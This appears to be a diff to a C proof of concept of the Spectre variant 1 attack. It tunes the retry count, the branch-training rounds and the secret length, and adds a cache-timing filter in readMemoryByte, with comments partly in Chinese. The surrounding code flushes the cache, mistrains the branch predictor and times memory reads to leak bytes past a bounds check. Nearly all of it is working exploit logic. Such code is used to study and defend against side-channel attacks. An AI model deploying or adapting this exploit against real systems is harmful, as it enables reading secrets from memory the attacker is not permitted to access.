@@ -18,6 +18,7 @@
 #include <assert.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include <time.h>
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtscp and clflush */
 #pragma optimize("gt",on)
@@ -40,6 +41,9 @@ uint8_t array2[256 * 512];
  Analysis code
 ********************************************************************/
  #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+ #define TRY_TIMES (1)
+ #define TRAIN_ROUNDS (6) //== 必须可以整除6
+ #define SECRET_LEN (40)
 
  /* Report best guess in value[0] and runner-up in value[1] */
  void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
@@ -53,14 +57,14 @@ uint8_t array2[256 * 512];
 	for (i = 0; i < 256; i++)
 		results[i] = 0;
 
-	for (tries = 999; tries > 0; tries--) {
+	for (tries = TRY_TIMES; tries > 0; tries--) {
 		/* Flush array2[256*(0..255)] from cache */
 		for (i = 0; i < 256; i++)
 		_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
 
 		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
 		training_x = tries % array1_size;
-		for (j = 29; j >= 0; j--) {
+		for (j = TRAIN_ROUNDS - 1; j >= 0; j--) {
 			_mm_clflush(&array1_size);
 			volatile int z;
 			for (z = 0; z < 100; z++) {} /* Delay (can also mfence) */
@@ -86,6 +90,7 @@ uint8_t array2[256 * 512];
 			junk = *addr; /* MEMORY ACCESS TO TIME */
 			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 			//if (time2 <= CACHE_HIT_THRESHOLD)
+			//mix_i != array1dupe[tries % array1_size]==去掉非投机执行的训练行为
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1dupe[tries % array1_size])
 			{
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
@@ -122,7 +127,7 @@ int spectre_main(int argc, char **argv) {
         	abort();
 
 	
-	int i, score[2], len=40;
+	int i, score[2], len=SECRET_LEN;
 	uint8_t value[2];
 	
 	for (i = 0; i < sizeof(array2); i++)
